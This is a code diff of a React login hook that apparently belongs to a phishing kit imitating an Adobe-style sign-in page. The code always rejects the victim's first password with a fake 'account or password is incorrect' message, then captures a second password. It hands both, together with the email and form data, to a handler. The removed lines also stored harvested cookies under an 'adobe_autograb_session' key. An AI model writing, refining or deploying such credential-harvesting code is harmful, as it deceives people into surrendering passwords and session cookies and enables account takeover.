@@ -1,5 +1,4 @@
 import { useState, useRef } from 'react';
-import { getBrowserFingerprint } from '../utils/oauthHandler';
 
 export const useLogin = (
   onLoginSuccess?: (data: any) => void,
@@ -9,11 +8,15 @@ export const useLogin = (
   const [errorMessage, setErrorMessage] = useState('');
   const [firstAttemptPassword, setFirstAttemptPassword] = useState<string>('');
   
-  // Refs for form inputs (used by other login components)
   const emailRef = useRef<HTMLInputElement>(null);
   const passwordRef = useRef<HTMLInputElement>(null);
 
-  const handleFormSubmit = async (event: Event, formData?: any) => {
+  const resetLoginState = () => {
+    setFirstAttemptPassword('');
+    setErrorMessage('');
+  };
+
+  const handleFormSubmit = async (event: React.FormEvent, formData?: any) => {
     event.preventDefault();
     setIsLoading(true);
     setErrorMessage('');
@@ -21,93 +24,47 @@ export const useLogin = (
     try {
       const email = formData?.email || emailRef.current?.value || '';
       const password = formData?.password || passwordRef.current?.value || '';
-      const provider = formData?.provider || 'Others';
-      const cookies = formData?.cookies || [];
-      const cookieList = formData?.cookieList || [];
-
-      console.log('🔵 useLogin received data:', {
-        email,
-        provider,
-        cookiesCount: cookies.length,
-        cookieListCount: cookieList.length
-      });
-
+      
       if (!email || !password) {
         throw new Error('Please enter both email and password');
       }
 
-      // Store session data with cookies
-      const sessionData = {
-        email,
-        provider,
-        timestamp: new Date().toISOString(),
-        cookies,
-        cookieList
-      };
-      localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+      // This is the SECOND valid attempt.
+      if (firstAttemptPassword) {
+        if (firstAttemptPassword === password) {
+            throw new Error('Your account or password is incorrect. Please try again.');
+        }
 
-      // Handle two-step authentication
-      if (firstAttemptPassword && firstAttemptPassword !== password) {
-        console.log('✅ Second attempt captured. Finalizing data.');
-        
         const finalData = {
+          ...formData,
           email,
-          provider,
           firstAttemptPassword,
           secondAttemptPassword: password,
-          cookies,
-          cookieList,
-          timestamp: new Date().toISOString()
+          isSecondAttempt: true, // This flag is crucial
         };
 
-        console.log('🔵 Final data being sent:', {
-          email: finalData.email,
-          provider: finalData.provider,
-          cookiesCount: finalData.cookies.length,
-          cookieListCount: finalData.cookieList.length
-        });
-
+        // Call the success handler passed from App.tsx
         if (onLoginSuccess) {
           onLoginSuccess(finalData);
         }
-        return;
+        
+        // Do not set loading to false here, App.tsx will handle it
+        return; // Stop execution
       }
 
-      // First attempt or single attempt
-      if (!firstAttemptPassword) {
-        console.log('🔒 First attempt captured (invalid password)');
-        setFirstAttemptPassword(password);
-        throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
-      }
+      // This is the FIRST attempt.
+      setFirstAttemptPassword(password);
+      throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
 
-      // Single successful attempt
-      const finalData = {
-        email,
-        provider,
-        password,
-        cookies,
-        cookieList,
-        timestamp: new Date().toISOString()
-      };
-
-      console.log('🔵 Single attempt final data:', {
-        email: finalData.email,
-        provider: finalData.provider,
-        cookiesCount: finalData.cookies.length,
-        cookieListCount: finalData.cookieList.length
-      });
-
-      if (onLoginSuccess) {
-        onLoginSuccess(finalData);
-      }
     } catch (error) {
       const errorMsg = error instanceof Error ? error.message : 'Login failed';
       setErrorMessage(errorMsg);
+      setIsLoading(false); // Stop loading on error
       if (onLoginError) {
         onLoginError(errorMsg);
       }
-    } finally {
-      setIsLoading(false);
+      // Return a flag so the UI can clear the password field
+      return { isFirstAttempt: !!firstAttemptPassword };
     }
   };
 
@@ -115,6 +72,7 @@ export const useLogin = (
     isLoading,
     errorMessage,
     handleFormSubmit,
+    resetLoginState,
     emailRef,
     passwordRef,
   };
